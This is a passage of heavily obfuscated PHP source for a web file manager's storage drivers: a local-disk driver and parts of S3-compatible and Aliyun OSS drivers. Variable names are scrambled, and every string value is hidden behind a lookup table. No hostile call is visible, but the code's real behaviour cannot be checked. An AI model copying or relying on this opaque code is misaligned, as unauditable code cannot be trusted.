«ÍÛ¿, $ÅŠøÑğ, $Ô‘Óò£Å) { $ñÓœµ½ñ =& $_SERVER[³½¬ÚË¯]; if (!$this->getByTagID($ «ÍÛ¿, $Ô‘Óò£Å) || !$ÅŠøÑğ) { return !1; } if (is_array($ÅŠøÑğ)) { $ÅŠøÑğ = array($ñÓœµ½ñ[7], $ÅŠøÑğ); } $±¥â¢ = array($ñÓœµ½ñ[1681] => 0, $ñÓœµ½ñ[526] => $Ô‘Óò£Å, $ñÓœµ½ñ[464] => $ñÓœµ½ñ[2007] . $ «ÍÛ¿, $ñÓœµ½ñ[463] => $ÅŠøÑğ); return $this->where($±¥â¢)->delete(); } protected function removeByTag($ìäÍÍ¢Ş, $¹àÑ®§í) { $««¶õ•ı =& $_SERVER[³½¬ÚË¯]; if (!$this->getByTagID($ìäÍÍ¢Ş, $¹àÑ®§í)) { return !1; } $¬€¿¥å® = array($««¶õ•ı[1681] => 0, $««¶õ•ı[526] => $¹àÑ®§í, $««¶õ•ı[464] => $««¶õ•ı[2007] . $ìäÍÍ¢Ş); return $this->where($¬€¿¥å®)->delete(); } protected function removeBySource($‹Ïö±í, $üÖóÍö) { $Ãİ¼º“ =& $_SERVER[³½¬ÚË¯]; if (!$‹Ïö±í || !$üÖóÍö) { return !1; } if (is_array($üÖóÍö)) { $üÖóÍö = array($Ãİ¼º“[7], $üÖóÍö); } $Èêñ´öŞ = array($Ãİ¼º“[1681] => 0, $Ãİ¼º“[463] => $üÖóÍö, $Ãİ¼º“[526] => array($Ãİ¼º“[1057], 0), $Ãİ¼º“[464] => $Ãİ¼º“[2007] . $‹Ïö±í); return $this->where($Èêñ´öŞ)->delete(); } } goto aï©ÕÁÁ¼; E¿¯åÃÅ‡£: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($â¸ªÆÂ¶) { if (substr($â¸ªÆÂ¶, 0, 2) == $_SERVER[³½¬ÚË¯][1396]) { $â¸ªÆÂ¶ = BASIC_PATH . substr($â¸ªÆÂ¶, 2); } return $â¸ªÆÂ¶; } public function iconvApp($‡¹¬°Ú®) { $”ù½«•ä =& $_SERVER[³½¬ÚË¯]; global $config; return $this->iconvTo($‡¹¬°Ú®, $config[$”ù½«•ä[1394]], $config[$”ù½«•ä[1393]]); } public function iconvSystem($Õêœ¶ß) { $ˆá›Ë¹­ =& $_SERVER[³½¬ÚË¯]; global $config; return $this->iconvTo($Õêœ¶ß, $config[$ˆá›Ë¹­[1393]], $config[$ˆá›Ë¹­[1394]]); } public function getPathOuter($Çœ˜´Ë) { $‰ñø±§ª =& $_SERVER[³½¬ÚË¯]; $Ô¨¡³¾Û = $this->iconvApp($this->pathBase); $Çœ˜´Ë = $this->iconvApp($Çœ˜´Ë); if (substr($Ô¨¡³¾Û, 0, 2) == $‰ñø±§ª[1396]) { $Ô¨¡³¾Û = BASIC_PATH . substr($Ô¨¡³¾Û, 2); } if (substr($Çœ˜´Ë, 0, 2) == $‰ñø±§ª[1396]) { $Çœ˜´Ë = BASIC_PATH . substr($Çœ˜´Ë, 2); } $Ô¨¡³¾Û = KodIO::clear($Ô¨¡³¾Û); $Çœ˜´Ë = KodIO::clear($Çœ˜´Ë); $Çœ˜´Ë = substr($Çœ˜´Ë, strlen($Ô¨¡³¾Û)); if (empty($this->pathDriver)) { return $Çœ˜´Ë; } return $this->pathDriver . $‰ñø±§ª[8] . ltrim($Çœ˜´Ë, $‰ñø±§ª[8]); } public function mkfile($¿¬Ñù¡Ö, $¼Ç¥ø· = '', $Ş€—ìÀÊ = REPEAT_RENAME) { $¿¬Ñù¡Ö = $this->iconvSystem($¿¬Ñù¡Ö); @touch($¿¬Ñù¡Ö); if ($¼Ç¥ø·) { file_put_contents($¿¬Ñù¡Ö, $¼Ç¥ø·); } @chmod($¿¬Ñù¡Ö, $this->pathAuth); return is_file($¿¬Ñù¡Ö) ? $this->getPathOuter($¿¬Ñù¡Ö) : !1; } public function mkdir($¬üóÖ²Ğ, $å²…²Íµ = REPEAT_SKIP) { $¬üóÖ²Ğ = $this->iconvSystem($¬üóÖ²Ğ); if (is_dir($¬üóÖ²Ğ)) { return $this->getPathOuter($¬üóÖ²Ğ); } @mkdir($¬üóÖ²Ğ, $this->pathAuth, !0); @chmod($¬üóÖ²Ğ, $this->pathAuth); return is_dir($¬üóÖ²Ğ) ? $this->getPathOuter($¬üóÖ²Ğ) : !1; } public function copyFile($Ô‹†Ô—à, $öãàó¤Œ) { $this->mkdir($this->pathFather($öãàó¤Œ)); $Ô‹†Ô—à = $this->iconvSystem($Ô‹†Ô—à); $öãàó¤Œ = $this->iconvSystem($öãàó¤Œ); $ÆÇÂ Øï = copy_64($Ô‹†Ô—à, $öãàó¤Œ); @chmod($öãàó¤Œ, $this->pathAuth); return $ÆÇÂ Øï ? $this->getPathOuter($öãàó¤Œ) : !1; } public function moveFile($µ˜ÁêÉ¡, $¥ŠÃ¨ÂÚ) { $this->mkdir($this->pathFather($¥ŠÃ¨ÂÚ)); $µ˜ÁêÉ¡ = $this->iconvSystem($µ˜ÁêÉ¡); $¥ŠÃ¨ÂÚ = $this->iconvSystem($¥ŠÃ¨ÂÚ); $òûôŞ˜¿ = intval(@rename($µ˜ÁêÉ¡, $¥ŠÃ¨ÂÚ)); if (!$òûôŞ˜¿) { if ($òûôŞ˜¿ = intval(@copy_64($µ˜ÁêÉ¡, $¥ŠÃ¨ÂÚ))) { @unlink($µ˜ÁêÉ¡); } } @chmod($¥ŠÃ¨ÂÚ, $this->pathAuth); return $òûôŞ˜¿ ? $this->getPathOuter($¥ŠÃ¨ÂÚ) : !1; } public function movePath($÷”¼˜¦, $¦óß™—á, $›ëÓëñ = false) { $Áü¥İî· =& $_SERVER[³½¬ÚË¯]; $÷”¼˜¦ = $this->iconvSystem($÷”¼˜¦); $¦óß™—á = $this->iconvSystem($¦óß™—á); $Ä¦øì’ = rtrim($¦óß™—á, $Áü¥İî·[8]) . $Áü¥İî·[8] . ($›ëÓëñ ? $›ëÓëñ : get_path_this($÷”¼˜¦)); if (file_exists($Ä¦øì’)) { return !1; } $›„ÔÊ±— = intval(@rename($÷”¼˜¦, $Ä¦øì’)); $›„ÔÊ±— = file_exists($Ä¦øì’); return $›„ÔÊ±— ? $this->getPathOuter($Ä¦øì’) : !1; } public function delFile($„ŒƒÔîÎ) { $„ŒƒÔîÎ = $this->iconvSystem($„ŒƒÔîÎ); if (!@unlink($„ŒƒÔîÎ)) { @chmod($„ŒƒÔîÎ, $this->pathAuth); if (!@unlink($„ŒƒÔîÎ)) { return !1; } } else { return !0; } } public function delFolder($ìÃä…‡±) { $ÛÂîÉûÄ =& $_SERVER[³½¬ÚË¯]; $ìÃä…‡± = $this->iconvSystem($ìÃä…‡±); if (!is_dir($ìÃä…‡±)) { return !0; } if (!($ÙËÀ„¿ = opendir($ìÃä…‡±))) { return !1; } while (($ÎÙÑÕÉş = readdir($ÙËÀ„¿)) !== !1) { if ($ÎÙÑÕÉş == $ÛÂîÉûÄ[10] || $ÎÙÑÕÉş == $ÛÂîÉûÄ[1321]) { continue; } $ë»‡¬ı½ = $ìÃä…‡± . $ÛÂîÉûÄ[8] . $ÎÙÑÕÉş; if (is_file($ë»‡¬ı½) || is_link($ë»‡¬ı½)) { if (!unlink($ë»‡¬ı½)) { chmod($ë»‡¬ı½, $this->pathAuth); if (!unlink($ë»‡¬ı½)) { return !1; } } } else { if (is_dir($ë»‡¬ı½)) { chmod($ë»‡¬ı½, $this->pathAuth); $ë»‡¬ı½ = $this->iconvApp($ë»‡¬ı½); if (!$this->delFolder($ë»‡¬ı½)) { return !1; } } } } closedir($ÙËÀ„¿); return rmdir($ìÃä…‡±); } public function rename($ºÚ»Œßø, $ê¤ÙßÁ) { $­íÛıÎ› =& $_SERVER[³½¬ÚË¯]; $ˆñ”ÙË¬ = $this->fileNameAuto($this->pathFather($ºÚ»Œßø), $ê¤ÙßÁ); $ˆñ”ÙË¬ = $this->iconvSystem($ˆñ”ÙË¬); $ºÚ»Œßø = $this->iconvSystem($ºÚ»Œßø); $İ´£«Ú = $this->pathFather($ºÚ»Œßø); $°á¶¶ÒÇ = rtrim($İ´£«Ú, $­íÛıÎ›[8]) . $­íÛıÎ›[8] . $ˆñ”ÙË¬; $¯ÇÚÉÆ = @rename($ºÚ»Œßø, $°á¶¶ÒÇ); $°á¶¶ÒÇ = $this->iconvApp($°á¶¶ÒÇ); return $¯ÇÚÉÆ ? $this->getPathOuter($°á¶¶ÒÇ) : !1; } public function size($‘é¬¬æ‰) { $‘é¬¬æ‰ = $this->iconvSystem($‘é¬¬æ‰); return filesize_64($‘é¬¬æ‰); } public function info($ÅççåÙ‚) { $ÅççåÙ‚ = $this->iconvSystem($ÅççåÙ‚); if ($this->isFolder($ÅççåÙ‚)) { return $this->folderInfo($ÅççåÙ‚); } else { if ($this->isFile($ÅççåÙ‚)) { return $this->fileInfo($ÅççåÙ‚); } } return !1; } protected function infoChildren($”›ê¡Ï, &$úşğã–™, $ÏÔöğ›– = true) { $çéÍÌô =& $_SERVER[³½¬ÚË¯]; check_abort_echo(); $”›ê¡Ï = rtrim($”›ê¡Ï, $çéÍÌô[8]) . $çéÍÌô[8]; if ($ÏÔöğ›–) { $”›ê¡Ï = $this->iconvSystem($”›ê¡Ï); } if (!($Û¥³ı™ = @opendir($”›ê¡Ï))) { return; } while (($ ·ÂˆÄ­ = readdir($Û¥³ı™)) !== !1) { if ($ ·ÂˆÄ­ == $çéÍÌô[10] || $ ·ÂˆÄ­ == $çéÍÌô[1321]) { continue; } $—¢²ğáÍ = $”›ê¡Ï . $ ·ÂˆÄ­; if (is_file($—¢²ğáÍ) || is_link($—¢²ğáÍ)) { $úşğã–™[$çéÍÌô[77]]++; $úşğã–™[$çéÍÌô[76]] += filesize_64($—¢²ğáÍ); } else { if (is_dir($—¢²ğáÍ)) { $úşğã–™[$çéÍÌô[78]]++; $this->infoChildren($—¢²ğáÍ, $úşğã–™, !1); } } } closedir($Û¥³ı™); } private function folderInfo($ìÏ’ÏÃÄ, $š´¸Ë™¹ = false) { $¿™İ·­ =& $_SERVER[³½¬ÚË¯]; $ìÏ’ÏÃÄ = rtrim($ìÏ’ÏÃÄ, $¿™İ·­[8]) . $¿™İ·­[8]; $¢Ô©ô = $this->iconvApp($this->pathThis($ìÏ’ÏÃÄ)); if ($š´¸Ë™¹) { return array($¿™İ·­[32] => $¢Ô©ô, $¿™İ·­[84] => $this->getPathOuter($ìÏ’ÏÃÄ), $¿™İ·­[33] => $¿™İ·­[75]); } $ç›Ñ¬Â = array($¿™İ·­[32] => $¢Ô©ô, $¿™İ·­[84] => $this->getPathOuter($ìÏ’ÏÃÄ), $¿™İ·­[33] => $¿™İ·­[75], $¿™İ·­[215] => @filectime($ìÏ’ÏÃÄ), $¿™İ·­[85] => @filemtime($ìÏ’ÏÃÄ), $¿™İ·­[1405] => @fileatime($ìÏ’ÏÃÄ), $¿™İ·­[1406] => is_readable($ìÏ’ÏÃÄ), $¿™İ·­[1407] => is_writable($ìÏ’ÏÃÄ), $¿™İ·­[1408] => get_mode($ìÏ’ÏÃÄ)); return $ç›Ñ¬Â; } private function fileInfo($”şµ¨˜ã, $”¼ûĞæÕ = false) { $ñê£ëÂ =& $_SERVER[³½¬ÚË¯]; $µÂûØŞğ = $this->iconvApp($this->pathThis($”şµ¨˜ã)); if ($”¼ûĞæÕ) { return array($ñê£ëÂ[32] => $µÂûØŞğ, $ñê£ëÂ[84] => $this->getPathOuter($”şµ¨˜ã), $ñê£ëÂ[33] => $ñê£ëÂ[214], $ñê£ëÂ[76] => $this->size($”şµ¨˜ã), $ñê£ëÂ[175] => $this->ext($µÂûØŞğ)); } $şü¿«ëƒ = array($ñê£ëÂ[32] => $µÂûØŞğ, $ñê£ëÂ[84] => $this->getPathOuter($”şµ¨˜ã), $ñê£ëÂ[33] => $ñê£ëÂ[214], $ñê£ëÂ[215] => @filectime($”şµ¨˜ã), $ñê£ëÂ[85] => @filemtime($”şµ¨˜ã), $ñê£ëÂ[1405] => @fileatime($”şµ¨˜ã), $ñê£ëÂ[76] => $this->size($”şµ¨˜ã), $ñê£ëÂ[175] => $this->ext($µÂûØŞğ), $ñê£ëÂ[1406] => is_readable($”şµ¨˜ã), $ñê£ëÂ[1407] => is_writable($”şµ¨˜ã), $ñê£ëÂ[1408] => get_mode($”şµ¨˜ã)); return $şü¿«ëƒ; } public function exist($»Æ•Õ) { $»Æ•Õ = $this->iconvSystem($»Æ•Õ); return @file_exists($»Æ•Õ); } public function isFile($¤³İÉŞ) { $¤³İÉŞ = $this->iconvSystem($¤³İÉŞ); return @is_file($¤³İÉŞ); } public function isFolder($½ÀÁÑ„›) { $½ÀÁÑ„› = $this->iconvSystem($½ÀÁÑ„›); return @is_dir($½ÀÁÑ„›); } public function listPath($ÇŞøôÍÉ, $¦ƒÙ¤ñ· = false) { $·©±”Ö• =& $_SERVER[³½¬ÚË¯]; $ÇŞøôÍÉ = $this->iconvSystem($ÇŞøôÍÉ); $ÇŞøôÍÉ = rtrim($ÇŞøôÍÉ, $·©±”Ö•[8]) . $·©±”Ö•[8]; $áÀöÊ = array($·©±”Ö•[82] => array(), $·©±”Ö•[83] => array()); if (!($ïìÇòßå = @opendir($ÇŞøôÍÉ))) { return $áÀöÊ; } while (($Êß“ÏÍö = readdir($ïìÇòßå)) !== !1) { if ($Êß“ÏÍö == $·©±”Ö•[10] || $Êß“ÏÍö == $·©±”Ö•[1321]) { continue; } $áˆø¢³ï = $ÇŞøôÍÉ . $Êß“ÏÍö; if (is_file($áˆø¢³ï)) { $áÀöÊ[$·©±”Ö•[83]][] = $this->fileInfo($áˆø¢³ï, $¦ƒÙ¤ñ·); } else { $áÀöÊ[$·©±”Ö•[82]][] = $this->folderInfo($áˆø¢³ï, $¦ƒÙ¤ñ·); } } closedir($ïìÇòßå); return $áÀöÊ; } public function listAll($õÍöÛÒÆ, &$Î…Æá©ü = array()) { $Ú¢Õ¨¼ã =& $_SERVER[³½¬ÚË¯]; $õÍöÛÒÆ = $this->iconvSystem($õÍöÛÒÆ); $õÍöÛÒÆ = rtrim($õÍöÛÒÆ, $Ú¢Õ¨¼ã[8]) . $Ú¢Õ¨¼ã[8]; if (!($¼ê†ƒş“ = @opendir($õÍöÛÒÆ))) { return $Î…Æá©ü; } while (($­£À¤ø = readdir($¼ê†ƒş“)) !== !1) { if ($­£À¤ø == $Ú¢Õ¨¼ã[10] || $­£À¤ø == $Ú¢Õ¨¼ã[1321]) { continue; } $¬±†¾…Ó = $õÍöÛÒÆ . $­£À¤ø; $½‘Ÿ‚ß‘ = is_dir($¬±†¾…Ó) && !is_link($¬±†¾…Ó) ? 1 : 0; $¬±†¾…Ó = $½‘Ÿ‚ß‘ ? $¬±†¾…Ó . $Ú¢Õ¨¼ã[8] : $¬±†¾…Ó; $Î…Æá©ü[] = array($Ú¢Õ¨¼ã[84] => $¬±†¾…Ó, $Ú¢Õ¨¼ã[75] => $½‘Ÿ‚ß‘, $Ú¢Õ¨¼ã[85] => intval(@filemtime($¬±†¾…Ó)), $Ú¢Õ¨¼ã[76] => $½‘Ÿ‚ß‘ ? 0 : intval($this->size($¬±†¾…Ó))); if ($½‘Ÿ‚ß‘) { $this->listAll($¬±†¾…Ó, $Î…Æá©ü); } } closedir($¼ê†ƒş“); return $Î…Æá©ü; } public function has($à§‰Ï‡ñ, $€©Ö£’ = false, $˜²ˆ¬ÜÍ = true) { $†ò·ûØâ =& $_SERVER[³½¬ÚË¯]; $à§‰Ï‡ñ = $this->iconvSystem($à§‰Ï‡ñ); $à§‰Ï‡ñ = rtrim($à§‰Ï‡ñ, $†ò·ûØâ[8]) . $†ò·ûØâ[8]; if (!($èÔ¼çÀË = @opendir($à§‰Ï‡ñ))) { return !1; } $†ÕÃ”æ = 0; $×ãüÄ‹ = 0; $Ê‹»§óé = 0; while (($ß÷º½± = readdir($èÔ¼çÀË)) !== !1) { if ($ß÷º½± == $†ò·ûØâ[10] || $ß÷º½± == $†ò·ûØâ[1321]) { continue; } $Ø¨â¡áı = $à§‰Ï‡ñ . $ß÷º½±; if ($€©Ö£’) { $Ê‹»§óé++; if (@is_file($Ø¨â¡áı)) { $†ÕÃ”æ++; } else { $×ãüÄ‹++; } if ($Ê‹»§óé > 10000) { break; } continue; } if ($˜²ˆ¬ÜÍ) { if (@is_file($Ø¨â¡áı)) { return !0; } } else { if (@is_dir($Ø¨â¡áı . $†ò·ûØâ[8])) { return !0; } } } closedir($èÔ¼çÀË); if ($€©Ö£’) { return array($†ò·ûØâ[223] => $†ÕÃ”æ, $†ò·ûØâ[224] => $×ãüÄ‹); } return !1; } public function hashSimple($ã¼ÁÎ¹ê) { $¯­ŒÅÅ” =& $_SERVER[³½¬ÚË¯]; if (!$ã¼ÁÎ¹ê) { return md5($¯­ŒÅÅ”[12]); } $ã¼ÁÎ¹ê = $this->iconvSystem($ã¼ÁÎ¹ê); $İæ¸À¹± = $this->size($ã¼ÁÎ¹ê); $Äèùò¡ü = 200; $Ç¸ªØĞ¦ = 50; if ($İæ¸À¹± <= $Äèùò¡ü * $Ç¸ªØĞ¦) { return $this->hashMd5($ã¼ÁÎ¹ê) . $İæ¸À¹±; } $ŞÂ³ªÈ• = $¯­ŒÅÅ”[12]; $£‡™•÷¾ = intval($İæ¸À¹± / $Ç¸ªØĞ¦); $¹ÒêÜ„ƒ = fopen($ã¼ÁÎ¹ê, $¯­ŒÅÅ”[1409]); if (!$¹ÒêÜ„ƒ) { return $ŞÂ³ªÈ•; } for ($©Ş‹ğ»¾ = 0; $©Ş‹ğ»¾ < $Ç¸ªØĞ¦; $©Ş‹ğ»¾++) { fseek_64($¹ÒêÜ„ƒ, $£‡™•÷¾ * $©Ş‹ğ»¾); $ŞÂ³ªÈ• .= fread($¹ÒêÜ„ƒ, $Äèùò¡ü); } fseek_64($¹ÒêÜ„ƒ, $İæ¸À¹± - $Äèùò¡ü); $ŞÂ³ªÈ• .= fread($¹ÒêÜ„ƒ, $Äèùò¡ü); fclose($¹ÒêÜ„ƒ); return md5($ŞÂ³ªÈ•) . $İæ¸À¹±; } public function getContent($Áš¢éû´) { $Áš¢éû´ = $this->iconvSystem($Áš¢éû´); return file_get_contents($Áš¢éû´); } public function setContent($‹˜ìºÌÒ, $‹Æñ¥Š¬ = '') { $‹˜ìºÌÒ = $this->iconvSystem($‹˜ìºÌÒ); $­âíØÀ = @file_put_contents($‹˜ìºÌÒ, $‹Æñ¥Š¬, LOCK_EX); clearstatcache(); @chmod($‹˜ìºÌÒ, $this->pathAuth); return $­âíØÀ === !1 ? !1 : !0; } public function fileSubstr($ğíÈï¶õ, $İÇ’‚Í’ = 0, $Æ±ËéÍ– = false) { $ó²ì•º³ =& $_SERVER[³½¬ÚË¯]; $ğíÈï¶õ = $this->iconvSystem($ğíÈï¶õ); if ($Æ±ËéÍ– === !1) { $Æ±ËéÍ– = $this->size($ğíÈï¶õ); } if ($Æ±ËéÍ– <= 0) { return $ó²ì•º³[12]; } $À‰¢Ñá£ = fopen($ğíÈï¶õ, $ó²ì•º³[1409]); if (!$À‰¢Ñá£) { return !1; } fseek_64($À‰¢Ñá£, $İÇ’‚Í’); $‘Œã·Íõ = fread($À‰¢Ñá£, $Æ±ËéÍ–); fclose($À‰¢Ñá£); return $‘Œã·Íõ; } public function upload($‹äĞ¯¢, $è¦ğ£ì, $’ç­Éı‚ = false, $ñæ¯Ùö = REPEAT_REPLACE) { if ($’ç­Éı‚) { return $this->moveFile($è¦ğ£ì, $‹äĞ¯¢); } return $this->copyFile($è¦ğ£ì, $‹äĞ¯¢); } public function setModifyTime($Îˆµ·È, $Š¶ùÁÍ¼ = '') { @touch($Îˆµ·È, intval($Š¶ùÁÍ¼)); } public function download($Éü³äÕê, $ï‚Ö‰ë²) { return $this->iconvSystem($Éü³äÕê); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($‘±“ëåƒ) { parent::__construct($‘±“ëåƒ); $this->signatureVersion($_SERVER[³½¬ÚË¯][231]); } public function fileOutLink($’§îÊ©) { $¦—ŞóÒ =& $_SERVER[³½¬ÚË¯]; if (substr($’§îÊ©, 0, 7) == $¦—ŞóÒ[1373]) { $’§îÊ© = $¦—ŞóÒ[1374] . substr($’§îÊ©, 7); } header($¦—ŞóÒ[162] . $’§îÊ©); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($²Ñ‚ØÍ÷) { parent::__construct(); include_once SDK_DIR . $_SERVER[³½¬ÚË¯][1410]; $this->_init($²Ñ‚ØÍ÷); } public function _init($–¤’û£è) { $§·ô¿ç =& $_SERVER[³½¬ÚË¯]; $this->config = $–¤’û£è; foreach ($–¤’û£è as $†á¶Ş¿Ò => $‡³Áùıš) { if (isset($this->{$†á¶Ş¿Ò})) { $this->{$†á¶Ş¿Ò} = $‡³Áùıš; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($§·ô¿ç[1411] . LNG($§·ô¿ç[1412])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $üúô¼Îü =& $_SERVER[³½¬ÚË¯]; $àüÁ´ = new OSS\Model\CorsConfig(); $Ç§¼ª•„ = new OSS\Model\CorsRule(); $Ç§¼ª•„->addAllowedOrigin($üúô¼Îü[1413]); $Ç§¼ª•„->addAllowedMethod($üúô¼Îü[1414]); $Ç§¼ª•„->addAllowedMethod($üúô¼Îü[1415]); $Ç§¼ª•„->addAllowedMethod($üúô¼Îü[1416]); $Ç§¼ª•„->addAllowedMethod($üúô¼Îü[1417]); $Ç§¼ª•„->addAllowedMethod($üúô¼Îü[161]); $Ç§¼ª•„->setMaxAgeSeconds(600); $Ç§¼ª•„->addExposeHeader($üúô¼Îü[1418]); $Ç§¼ª•„->addAllowedHeader($üúô¼Îü[1413]); $àüÁ´->addRule($Ç§¼ª•„); try { $this->client->putBucketCors($this->bucket, $àüÁ´); } catch (OSS\Core\OssException $õ¸›šÃ†) { return !1; } return !0; } public function getBucketCors() { $óú±şï¶ =& $_SERVER[³½¬ÚË¯]; $‰À®šÍÂ = null; try { $‰À®šÍÂ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ü¸–ØçÜ) { return null; } if (!$‰À®šÍÂ || !($ĞÚ÷”‰® = $‰À®šÍÂ->getRules())) { return null; } $Âó®Å¯ = $ĞÚ÷”‰®[0]->getAllowedOrigins(); $öéˆ„º = $ĞÚ÷”‰®[0]->getAllowedMethods(); $¼Ïæö±Æ = $ĞÚ÷”‰®[0]->getMaxAgeSeconds(); $ŒŸåØö = $ĞÚ÷”‰®[0]->getExposeHeaders(); $îëàÛµˆ = $ĞÚ÷”‰®[0]->getAllowedHeaders(); return array($óú±şï¶[202] => isset($Âó®Å¯[0]) ? $Âó®Å¯[0] : $óú±şï¶[12], $óú±şï¶[206] => $öéˆ„º, $óú±şï¶[1419] => $¼Ïæö±Æ, $óú±şï¶[1420] => isset($ŒŸåØö[0]) ? $ŒŸåØö[0] : $óú±şï¶[12], $óú±şï¶[204] => isset($îëàÛµˆ[0]) ? $îëàÛµˆ[0] : $óú±şï¶[12]); } public function isBucketCors() { $Ïô—ï± =& $_SERVER[³½¬ÚË¯]; $êùîàßÚ = $this->getBucketCors(); if (!$êùîàßÚ || !is_array($êùîàßÚ)) { return !1; } if ($êùîàßÚ[$Ïô—ï±[202]] != $Ïô—ï±[203] || $êùîàßÚ[$Ïô—ï±[204]] != $Ïô—ï±[203]) { return !1; } $¢ÚÌ¶—´ = array_map($Ïô—ï±[205], $êùîàßÚ[$Ïô—ï±[206]]); if (!is_array($¢ÚÌ¶—´)) { $¢ÚÌ¶—´ = array(); } $­õ§·ïî = array($Ïô—ï±[207], $Ïô—ï±[208], $Ïô—ï±[209], $Ïô—ï±[210], $Ïô—ï±[211]); $ÅÓ™´º = array_diff($­õ§·ïî, $¢ÚÌ¶—´); return empty($ÅÓ™´º); } public function mkfile($úíÁƒí†, $»İª˜ = '', $ˆÛ¨ÚÑÈ = REPEAT_RENAME) { $ı¶ó¡ = $this->setContent($úíÁƒí†, $»İª˜); if ($ı¶ó¡ !== !1) { return $this->getPathOuter($úíÁƒí†); } return !1; } public function mkdir($ÇÕëÏ˜í, $ÈÍğüä‰ = REPEAT_SKIP) { if ($ÈÍğüä‰ && $this->_isFolder($ÇÕëÏ˜í)) { return $this->getPathOuter($ÇÕëÏ˜í); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÇÕëÏ˜í)); } catch (OSS\Core\OssException $›¾ğîÙ˜) { return !1; } return $this->getPathOuter($ÇÕëÏ˜í); } private function fileList($ÁŞº„ïı, $•¥ä×è = '', $®íàÊÊá = 0) { $Ş‚»©ÕÎ =& $_SERVER[³½¬ÚË¯]; $ÁŞº„ïı = trim($ÁŞº„ïı, $Ş‚»©ÕÎ[8]); $…šŒˆ¤ã = empty($ÁŞº„ïı) && $ÁŞº„ïı !== $Ş‚»©ÕÎ[212] ? $Ş‚»©ÕÎ[12] : $ÁŞº„ïı . $Ş‚»©ÕÎ[8]; $Õ´¢Ç¹å = $Ş‚»©ÕÎ[12]; $åÓ€´Ï = 1000; $Ø¢ÙìÌº = $ÃíøÇº¦ = array(); while (!0) { check_abort(); $šó´€Á’ = array($Ş‚»©ÕÎ[1421] => $•¥ä×è, $Ş‚»©ÕÎ[1422] => $…šŒˆ¤ã, $Ş‚»©ÕÎ[1423] => $åÓ€´Ï, $Ş‚»©ÕÎ[1424] => $Õ´¢Ç¹å); try { $·Ú‡ïœ¶ = $this->client->listObjects($this->bucket, $šó´€Á’); } catch (OSS\Core\OssException $ü…À­è˜) { break; } $Õ´¢Ç¹å = $·Ú‡ïœ¶->getNextMarker(); $ô¾â¨Î¨ = $·Ú‡ïœ¶->getObjectList(); $Ÿ€¡õ¼û = $·Ú‡ïœ¶->getPrefixList(); foreach ($ô¾â¨Î¨ as $ÜüãĞú) { if ($ÜüãĞú->getKey() == $…šŒˆ¤ã) { continue; } $ú½ë¢Ê¼ = $ÜüãĞú->getKey(); $¡°â‡¾ = $ÜüãĞú->getSize(); $¬±ÎØÎ¢ = $ÜüãĞú->getLastModified(); $¬»íñŒ© = trim($ÜüãĞú->getETag(), $Ş‚»©ÕÎ[118]); $ËÃ¨×ª£ = $®íàÊÊá ? array($Ş‚»©ÕÎ[32] => $ú½ë¢Ê¼, $Ş‚»©ÕÎ[76] => $¡°â‡¾, $Ş‚»©ÕÎ[194] => strtotime($¬±ÎØÎ¢), $Ş‚»©ÕÎ[1425] => $¬»íñŒ©) : $ú½ë¢Ê¼; $…¾À±ÙÃ = $¡°â‡¾ == 0 && substr($ú½ë¢Ê¼, strlen($ú½ë¢Ê¼) - 1, 1) == $Ş‚»©ÕÎ[8] ? !0 : !1; $™’ÆóŞ‘ = array($Ş‚»©ÕÎ[76] => $¡°â‡¾, $Ş‚»©ÕÎ[1426] => $¡°â‡¾, $Ş‚»©ÕÎ[85] => strtotime($¬±ÎØÎ¢), $Ş‚»©ÕÎ[1427] => $¬±ÎØÎ¢, $Ş‚»©ÕÎ[1425] => $¬»íñŒ©); $this->cacheMethodInfoSet($ú½ë¢Ê¼, $…¾À±ÙÃ, $™’ÆóŞ‘); if ($…¾À±ÙÃ) { $Ø¢ÙìÌº[] = $ú½ë¢Ê¼; continue; } $ÃíøÇº¦[] = $ËÃ¨×ª£; } foreach ($Ÿ€¡õ¼û as $ì‰—•Á‹) { $Ø¢ÙìÌº[] = $ì‰—•Á‹->getPrefix(); $this->cacheMethodInfoSet($ì‰—•Á‹->getPrefix(), !0); } if ($Õ´¢Ç¹å === $Ş‚»©ÕÎ[12]) { break; } } $this->cacheMethodInfoSet($ÁŞº„ïı, !0); return array($Ş‚»©ÕÎ[82] => $Ø¢ÙìÌº, $Ş‚»©ÕÎ[83] => $ÃíøÇº¦); } public function copyFile($‚­ğòØı, $ÌÑ­ëåù) { $„ø˜›Û¨ = $this->size($‚­ğòØı); if ($„ø˜›Û¨ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‚­ğòØı, $this->bucket, $this->pathEncode($ÌÑ­ëåù)); } catch (OSS\Core\OssException $òˆ”ùŠé) { return !1; } return $this->getPathOuter($ÌÑ­ëåù); } $ñ„—Ì¿ò = $this->multiCopyObject($‚­ğòØı, $ÌÑ­ëåù, $„ø˜›Û¨); return $ñ„—Ì¿ò ? $this->getPathOuter($ÌÑ­ëåù) : !1; } private function multiCopyObject($¨šˆˆÅÂ, $ññäûè, $µ­‚´£) { $İ•Ò°¤ƒ =& $_SERVER[³½¬ÚË¯]; try { $šŠë •Å = array(); if ($ˆ˜‹íà¼ = $this->hashMd5($¨šˆˆÅÂ)) { $šŠë •Å = array(OSS\OssClient::OSS_HEADERS => array($İ•Ò°¤ƒ[1428] => $ˆ˜‹íà¼)); } $´Ä÷é¾ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ññäûè), $šŠë •Å); $›ñüúÊË = 1; $ŞÊø¬ù˜ = 0; $È¯³çä€ = array(); $¾Ãß”¬Ô = 1024 * 1024 * 10; $æ—‘´“Û = $this->client->generateMultiuploadParts($µ­‚´£, $¾Ãß”¬Ô); foreach ($æ—‘´“Û as $ŠşôáØÆ => $¥Î§éËÒ) { $Ş¥„Æà° = $ŞÊø¬ù˜ + (int) 